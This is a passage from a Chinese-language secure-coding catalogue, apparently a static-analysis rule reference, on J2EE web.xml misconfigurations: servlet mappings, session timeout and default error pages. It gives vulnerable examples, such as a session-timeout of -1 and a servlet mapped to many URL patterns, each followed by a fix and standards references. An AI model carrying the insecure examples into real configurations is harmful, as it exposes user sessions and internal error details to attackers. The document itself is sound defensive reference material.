<h5 id="RECOMMENDATIONS-186"><a href="#RECOMMENDATIONS-186" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为每个 servlet 映射使用截然不同的 URL 模式。</p>
<p>例 2：在以下示例中，每个 servlet 映射均使用唯一的 URL 模式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;ServletA&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/servletA/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;ServletB&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/servletB/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-185"><a href="#REFERENCES-185" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[3] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="J2EE-Misconfiguration-Excessive-Servlet-Mappings"><a href="#J2EE-Misconfiguration-Excessive-Servlet-Mappings" class="headerlink" title="J2EE Misconfiguration: Excessive Servlet Mappings"></a>J2EE Misconfiguration: Excessive Servlet Mappings</h4><h5 id="ABSTRACT-187"><a href="#ABSTRACT-187" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>多个 URL 模式映射到单个 Servlet，这种情况通常表明体系结构较差或不标准。</p>
<h5 id="EXPLANATION-188"><a href="#EXPLANATION-188" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>映射到单个 Servlet 的多个 URL 模式可视为 Servlet 执行过多函数的标志。</p>
<p>例 1：在以下示例中，五个 URL 模式映射至单个 Servlet。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/helloworld*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/servlet*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/mservlet*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-187"><a href="#RECOMMENDATIONS-187" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将任意执行多个功能的 Servlet 的功能分解成单独的 Servlet，每个都包含自己的 URL 映射和单独的功能。这对执行特权操作或敏感操作的 Servlet 尤其重要，因为这可以减少访问该功能的路径数。</p>
<p>例 2：在以下示例中，一个 URL 模式映射至单个 Servlet。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-186"><a href="#REFERENCES-186" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<h4 id="J2EE-Misconfiguration-Excessive-Session-Timeout"><a href="#J2EE-Misconfiguration-Excessive-Session-Timeout" class="headerlink" title="J2EE Misconfiguration: Excessive Session Timeout"></a>J2EE Misconfiguration: Excessive Session Timeout</h4><h5 id="ABSTRACT-188"><a href="#ABSTRACT-188" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果会话超时时间过长，攻击者就会有更多时间危害用户帐户。</p>
<h5 id="EXPLANATION-189"><a href="#EXPLANATION-189" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>会话持续时间越长，攻击者危害用户帐户的机会就越大。当会话处于活动状态时，攻击者可能会强力攻击用户的密码、破解用户的无线加密密钥或者通过打开的浏览器强占会话。如果创建大量的会话，较长的会话超时时间还会阻止系统释放内存，并最终导致 denial of service。</p>
<p>例 1：如果会话超时时间为零或小于零，会话永远都不会过期。以下示例显示，如果会话超时时间设置为 -1，则会导致此会话永远保持活动状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;session-config&gt;</span><br><span class="line"></span><br><span class="line">    &lt;session-timeout&gt;-1&lt;/session-timeout&gt;</span><br><span class="line"></span><br><span class="line">&lt;/session-config&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;session-timeout&gt;</code> 标记为 Web 应用程序中的所有会话定义默认的会话超时间隔。如果缺少 <code>&lt;session-timeout&gt;</code> 标记，则由容器来设置默认超时间隔。</p>
<h5 id="RECOMMENDATIONS-188"><a href="#RECOMMENDATIONS-188" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将会话超时间隔设置为 30 分钟或更少，既能使用户在一段时间内与应用程序互动，又提供了一个限制窗口攻击的合理范围。</p>
<p>例 2：以下示例将会话超时间隔设置为 20 分钟。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;session-config&gt;</span><br><span class="line"></span><br><span class="line">  &lt;session-timeout&gt;20&lt;/session-timeout&gt;</span><br><span class="line"></span><br><span class="line">&lt;/session-config&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-187"><a href="#REFERENCES-187" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 613</p>
<p>[3] Standards Mapping - FIPS200 IA</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-12 Session Termination (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M9 Improper Session Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A3 Broken Authentication and Session Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A7 Broken Authentication and Session Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A3 Broken Authentication and Session Management</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A2 Broken Authentication and Session Management</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3, Requirement 8.5.15</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7, Requirement 8.5.15</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8, Requirement 8.5.15</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10, Requirement 8.1.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10, Requirement 8.1.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10, Requirement 8.1.8</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3415 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3415 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3415 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3415 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3415 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3415 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3415 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000070 CAT II, APSC-DV-000080 CAT II, APSC-DV-001980 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000070 CAT II, APSC-DV-000080 CAT II, APSC-DV-001980 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000070 CAT II, APSC-DV-000080 CAT II, APSC-DV-001980 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Session Expiration</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Session Expiration (WASC-47)</p>
<h4 id="J2EE-Misconfiguration-Incomplete-Error-Handling"><a href="#J2EE-Misconfiguration-Incomplete-Error-Handling" class="headerlink" title="J2EE Misconfiguration: Incomplete Error Handling"></a>J2EE Misconfiguration: Incomplete Error Handling</h4><h5 id="ABSTRACT-189"><a href="#ABSTRACT-189" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Web 应用程序必须定义默认的错误页面，以避免攻击者通过应用程序容器的内置错误响应来挖掘信息。</p>
<h5 id="EXPLANATION-190"><a href="#EXPLANATION-190" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者浏览网站寻找漏洞时，站点提供信息的数量是攻击成败的关键。如果应用程序向攻击者展示了堆栈踪迹，那么堆栈释放的信息将使攻击者的攻击变得轻而易举。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。</p>
<p>因此，应用程序应通过配置来指定一个默认的错误页面，以保证应用程序永远不会向攻击者泄漏错误消息。处理标准 HTTP 错误代码是一种简单、有效、安全的做法；完善的配置还会定义一个用于补救的错误处理程序，来捕获应用程序可能抛出的所有异常。</p>
<h5 id="RECOMMENDATIONS-189"><a href="#RECOMMENDATIONS-189" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Web 应用程序必须配置有默认的错误页面。您的 web.xml 文件中应当至少包含以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;500&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-188"><a href="#REFERENCES-188" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 7</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="J2EE-Misconfiguration-Incomplete-Error-Handling-404"><a href="#J2EE-Misconfiguration-Incomplete-Error-Handling-404" class="headerlink" title="J2EE Misconfiguration: Incomplete Error Handling - (404)"></a>J2EE Misconfiguration: Incomplete Error Handling - (404)</h4><h5 id="ABSTRACT-190"><a href="#ABSTRACT-190" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Web 应用程序必须针对 404 错误定义默认的错误页面，以避免攻击者通过应用程序容器的内置错误响应来挖掘信息。</p>
<h5 id="EXPLANATION-191"><a href="#EXPLANATION-191" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者浏览网站寻找漏洞时，站点提供信息的数量是攻击成败的关键。如果应用程序向攻击者展示了堆栈踪迹，那么堆栈释放的信息将使攻击者的攻击变得轻而易举。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。</p>
<p>因此，应用程序应通过配置来指定一个默认的错误页面，以保证应用程序永远不会向攻击者泄漏错误消息。处理标准 HTTP 错误代码是一种简单、有效、安全的做法；完善的配置还会定义一个用于补救的错误处理程序，来捕获应用程序可能抛出的所有异常。</p>
<h5 id="RECOMMENDATIONS-190"><a href="#RECOMMENDATIONS-190" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Web 应用程序必须配置有默认的错误页面。您的 web.xml 文件中应当至少包含以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;500&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-189"><a href="#REFERENCES-189" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 7</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="J2EE-Misconfiguration-Incomplete-Error-Handling-500"><a href="#J2EE-Misconfiguration-Incomplete-Error-Handling-500" class="headerlink" title="J2EE Misconfiguration: Incomplete Error Handling - (500)"></a>J2EE Misconfiguration: Incomplete Error Handling - (500)</h4><h5 id="ABSTRACT-191"><a href="#ABSTRACT-191" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Web 应用程序必须针对 500 错误定义默认的错误页面，以避免攻击者通过应用程序容器的内置错误响应来挖掘信息。</p>
<h5 id="EXPLANATION-192"><a href="#EXPLANATION-192" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者浏览网站寻找漏洞时，站点提供信息的数量是攻击成败的关键。如果应用程序向攻击者展示了堆栈踪迹，那么堆栈释放的信息将使攻击者的攻击变得轻而易举。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。</p>
<p>因此，应用程序应通过配置来指定一个默认的错误页面，以保证应用程序永远不会向攻击者泄漏错误消息。处理标准 HTTP 错误代码是一种简单、有效、安全的做法；完善的配置还会定义一个用于补救的错误处理程序，来捕获应用程序可能抛出的所有异常。</p>
<h5 id="RECOMMENDATIONS-191"><a href="#RECOMMENDATIONS-191" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Web 应用程序必须配置有默认的错误页面。您的 web.xml 文件中应当至少包含以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;500&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-190"><a href="#REFERENCES-190" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 7</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
